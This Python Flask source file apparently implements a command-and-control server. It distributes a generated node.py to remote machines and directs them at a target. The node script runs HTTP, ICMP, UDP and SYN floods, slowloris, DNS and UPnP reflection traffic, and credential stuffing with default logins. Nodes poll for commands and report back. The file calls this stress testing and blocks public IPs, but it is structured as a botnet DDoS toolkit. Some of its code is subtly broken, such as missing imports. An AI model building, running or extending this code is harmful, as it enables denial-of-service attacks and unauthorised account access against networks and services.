from flask import Flask, Response, jsonify, request, render_template
from datetime import datetime, timedelta
import threading
import time
import sqlite3
import json
import os

app = Flask(__name__)

API_KEY=os.getenv('API_KEY')
NODE_TIMEOUT = 30

NODE_PY_TEMPLATE_HEAD = """
import requests
import asyncio
import aiohttp
import random

SERVER_URL = "{server_url_template}"
NODE_ID = None
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
]
API_KEY = "{api_key_template}"
"""

NODE_PY_TEMPLATE = """
def register_node():
    global NODE_ID
    
    response = requests.post(
        SERVER_URL + "/register",
        json={'key': API_KEY}
    )
    
    if response.ok:
        NODE_ID = response.json()['node_id']
        print("Registered as " + NODE_ID)

async def run_all_attacks(test_params):
    target_ip = test_params['target_ip']
    ports = test_params['target_ports']
    
    async with aiohttp.ClientSession() as session:
        
        tasks = [
            http_flood(session, target_ip, ports),
            dns_amplification(target_ip),
            upnp_abuse(target_ip),
            credential_stuffing(session, target_ip),
            icmp_flood(target_ip),
            slowloris(target_ip, ports),
            udp_flood(target_ip),
            syn_flood(target_ip, ports)
        ]
        
        await asyncio.gather(*tasks)

async def http_flood(session, target_ip, ports):
    while True:
        for port in ports:
            try:
                await session.get(
                    "http://" + target_ip + ":" + port + "/",
                    headers={'User-Agent': random.choice(USER_AGENTS)},
                    timeout=2
                )
                report_request(attack_type='HTTP Flood', status_code=200)
            except:
                report_request(attack_type='HTTP Flood', status_code=500)
                pass

async def dns_amplification(target_ip):
    dns_query = bytes.fromhex(
        "000001000001000000000000"          # Header: transaction ID, flags, counts
        "0a636c6f7564666c617265"            # QNAME: "cloudflare" (0a = length 10, then ASCII)
        "03636f6d"                          # QNAME: "com" (03 = length 3, then ASCII)
        "00"                                # End of QNAME
        "0001"                              # QTYPE: A record
        "0001"                              # QCLASS: IN (Internet)
    )
    
    while True:
        try:
            _, writer = await asyncio.open_connection(target_ip, 53)
            writer.write(dns_query)
            await writer.drain()
            writer.close()
            report_request(attack_type='DNS Amplification', status_code=200)
        except:
            report_request(attack_type='DNS Amplification', status_code=500)
            pass

async def upnp_abuse(target_ip):
    ssdp_message = "4D2D534541524348202A20485454502F312E315C725C6E486F73743A203233392E3235352E3235352E3235303A313930305C725C6E4D414E3A205C22737364703A646973636F7665725C225C725C6E4D583A20315C725C6E53543A2075706E703A726F6F746465766963655C725C6E5C725C6E"
    ssdp_message = bytearray.fromhex(ssdp_message).decode()
    while True:
        try:
            _, writer = await asyncio.open_connection(target_ip, 1900)
            writer.write(ssdp_message.encode())
            await writer.drain()
            writer.close()
            report_request(attack_type='UPnP Abuse', status_code=200)
        except:
            report_request(attack_type='UPnP Abuse', status_code=500)
            pass

async def credential_stuffing(session, target_ip):
    creds = [('admin', 'admin'), ('user', 'user'), ('admin', 'password')]
    while True:
        for port in [80, 8080]:
            for user, pwd in creds:
                try:
                    await session.post(
                        "http://" + target_ip + ":" + port + "/",
                        data={'username': user, 'password': pwd}
                    )
                    report_request(attack_type='Credential Stuffing', status_code=200)
                except:
                    report_request(attack_type='Credential Stuffing', status_code=500)
                    pass

async def icmp_flood(target_ip):
    loop = asyncio.get_event_loop()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setblocking(False)
        packet = b'\x08\x00\xf7\xff\x00\x00\x00\x00' + b'P'*56  # ICMP Echo Request
        
        while True:
            await loop.sock_sendto(sock, packet, (target_ip, 0))
            report_request(attack_type='ICMP Flood', status_code=200)
            await asyncio.sleep(0.001)
    except:
        report_request(attack_type='ICMP Flood', status_code=500)

async def slowloris(target_ip, ports):
    while True:
        for port in ports:
            try:
                reader, writer = await asyncio.open_connection(target_ip, port)
                # Send partial HTTP headers
                writer.write(
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Length: 1000000\r\n\r\n".encode()
                )
                await writer.drain()
                # Keep sending headers periodically
                while True:
                    await asyncio.sleep(10)
                    writer.write(b"X-a: b\r\n")
                    await writer.drain()
                    report_request(attack_type='Slowloris', status_code=200)
            except:
                report_request(attack_type='Slowloris', status_code=500)

async def udp_flood(target_ip):
    loop = asyncio.get_event_loop()
    try:
        transport, _ = await loop.create_datagram_endpoint(
            asyncio.DatagramProtocol,
            family=socket.AF_INET
        )
        while True:
            port = random.randint(1, 65535)
            transport.sendto(os.urandom(1024), (target_ip, port))
            report_request(attack_type='UDP Flood', status_code=200)
            await asyncio.sleep(0.001)
    except:
        report_request(attack_type='UDP Flood', status_code=500)

async def syn_flood(target_ip, ports):
    while True:
        for port in ports:
            try:
                # Send SYN and immediately close (simulated attack)
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_ip, port),
                    timeout=0.1
                )
                writer.close()
                await writer.wait_closed()
                report_request(attack_type='SYN Flood', status_code=200)
            except asyncio.TimeoutError:
                report_request(attack_type='SYN Flood', status_code=200)
            except:
                report_request(attack_type='SYN Flood', status_code=500)

def report_request(attack_type=None, status_code=None):
    requests.post(
        SERVER_URL + "/report/" + NODE_ID,
        json={'requests': 1, 'attack_type': attack_type, 'status_code': status_code}
    )

async def monitor_commands():
    while True:
        try:
            response = requests.get(SERVER_URL + "/status/" + NODE_ID)
            if response.ok and (data := response.json()).get('status') == 'running':
                await run_all_attacks(data)
        
        except: pass
        await asyncio.sleep(5)

if __name__ == '__main__':
    register_node()
    if NODE_ID:
        asyncio.run(monitor_commands())
"""

# Initialize database
def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS nodes (
            node_id TEXT PRIMARY KEY,
            last_seen DATETIME,
            status TEXT,
            ip TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tests (
            test_id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_ip TEXT,
            target_ports TEXT,
            duration INTEGER,
            start_time DATETIME,
            status TEXT,
            total_requests INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reports (
            report_id INTEGER PRIMARY KEY AUTOINCREMENT,
            node_id TEXT,
            test_id INTEGER,
            requests INTEGER,
            timestamp DATETIME,
            FOREIGN KEY(node_id) REFERENCES nodes(node_id),
            FOREIGN KEY(test_id) REFERENCES tests(test_id)
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def dashboard():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT node_id, last_seen, status, ip FROM nodes')
    nodes = {
        row[0]: {
            'last_seen': datetime.fromisoformat(row[1]),
            'status': row[2],
            'ip': row[3]
        } for row in cursor.fetchall()
    }
    
    cursor.execute('SELECT * FROM tests WHERE status = "running" LIMIT 1')
    active_test_row = cursor.fetchone()
    active_test = None
    if active_test_row:
        active_test = {
            'target_ip': active_test_row[1],
            'target_ports': json.loads(active_test_row[2]),
            'duration': active_test_row[3],
            'start_time': datetime.fromisoformat(active_test_row[4]),
            'status': active_test_row[5],
            'total_requests': active_test_row[6]
        }
    
    conn.close()
    return render_template('dashboard.html', nodes=nodes, test=active_test)

@app.route('/register', methods=['POST'])
def register_node():
    if request.json.get('key') != API_KEY:
        return jsonify({"error": "Invalid Key"}), 401
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    try:
        cursor.execute('INSERT INTO nodes (last_seen, status, ip) VALUES (?, ?, ?)', (datetime.now().isoformat(), 'idle', request.remote_addr))
        node_id = f"node_{cursor.lastrowid}"
        cursor.execute('UPDATE nodes SET node_id = ? WHERE rowid = ?', (node_id, cursor.lastrowid))
        conn.commit()
    except sqlite3.Error as e:
        conn.rollback()
        return jsonify({"error": "Database error"}), 500
    finally:
        conn.close()
    
    return jsonify({"node_id": node_id})

@app.route('/test', methods=['POST'])
def start_test():
    data = request.json
    
    if not is_private_ip(data['target_ip']):
        return jsonify({"error": "Public IPs not allowed"}), 400

    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT test_id FROM tests WHERE status = "running" LIMIT 1')
    if cursor.fetchone():
        conn.close()
        return jsonify({"error": "Test already running"}), 400
    
    try:
        ports = json.dumps(data.get('ports', [80, 443, 7547, 8080]))
        cursor.execute('''
            INSERT INTO tests (target_ip, target_ports, duration, start_time, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            data['target_ip'],
            ports,
            data['duration'],
            datetime.now().isoformat(),
            'running'
        ))
        test_id = cursor.lastrowid
        conn.commit()
        
        threading.Timer(
            data['duration'],
            lambda: end_test(test_id)
        ).start()
        
    except sqlite3.Error as e:
        conn.rollback()
        return jsonify({"error": "Database error"}), 500
    finally:
        conn.close()
    
    return jsonify({"status": "Attack started"})

@app.route('/status/<node_id>', methods=['GET'])
def get_status(node_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT 1 FROM nodes WHERE node_id = ?', (node_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Invalid node"}), 404
    
    cursor.execute('''
        UPDATE nodes 
        SET last_seen = ?
        WHERE node_id = ?
    ''', (datetime.now().isoformat(), node_id))
    conn.commit()
    
    cursor.execute('SELECT * FROM tests WHERE status = "running" LIMIT 1')
    test_row = cursor.fetchone()
    conn.close()
    
    if test_row:
        return jsonify({
            'target_ip': test_row[1],
            'target_ports': json.loads(test_row[2]),
            'duration': test_row[3],
            'start_time': test_row[4],
            'status': test_row[5]
        })
    else:
        return jsonify({"status": "idle"})

@app.route('/report/<node_id>', methods=['POST'])
def receive_report(node_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    try:
        cursor.execute('SELECT test_id FROM tests WHERE status = "running" LIMIT 1')
        test_row = cursor.fetchone()
        if not test_row:
            return jsonify({"error": "No active test"}), 400
        
        test_id = test_row[0]
        requests = request.json.get('requests', 0)
        
        cursor.execute('''
            INSERT INTO reports (node_id, test_id, requests, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (node_id, test_id, requests, datetime.now().isoformat()))
        
        cursor.execute('''
            UPDATE tests 
            SET total_requests = total_requests + ? 
            WHERE test_id = ?
        ''', (requests, test_id))
        
        conn.commit()
    except sqlite3.Error as e:
        conn.rollback()
        return jsonify({"error": "Database error"}), 500
    finally:
        conn.close()
    
    return jsonify({"status": "received"})

@app.route('/generate', methods=['GET'])
def download_node():
    
    if 'server_addr' not in request.args:
        return jsonify({"error": "Missing server_addr"}), 400
    
    server_addr = request.args.get('server_addr')
    node_content = NODE_PY_TEMPLATE_HEAD.format(server_url_template=server_addr, api_key_template=API_KEY)
    node_content += NODE_PY_TEMPLATE
    return Response(
        node_content,
        mimetype='text/x-python',
        headers={'Content-Disposition': 'attachment; filename=node.py'}
    )

def end_test(test_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    try:
        cursor.execute('''
            UPDATE tests 
            SET status = 'completed' 
            WHERE test_id = ?
        ''', (test_id,))
        conn.commit()
        
        cursor.execute('SELECT total_requests FROM tests WHERE test_id = ?', (test_id,))
        total = cursor.fetchone()[0]
        print(f"Test completed. Total requests: {total}")
    finally:
        conn.close()

def cleanup_nodes():
    while True:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        try:
            cutoff = (datetime.now() - timedelta(seconds=NODE_TIMEOUT)).isoformat()
            cursor.execute('DELETE FROM nodes WHERE last_seen < ?', (cutoff,))
            conn.commit()
        finally:
            conn.close()
        time.sleep(10)

def is_private_ip(ip):
    octets = list(map(int, ip.split('.')))
    if octets[0] == 10: return True
    if octets[0] == 172 and 16 <= octets[1] <= 31: return True
    if octets[0] == 192 and octets[1] == 168: return True
    return False

if __name__ == '__main__':
    init_db()
    print(f"API key: {API_KEY}")
    threading.Thread(target=cleanup_nodes, daemon=True).start()
    app.run(host='0.0.0.0', port=7333)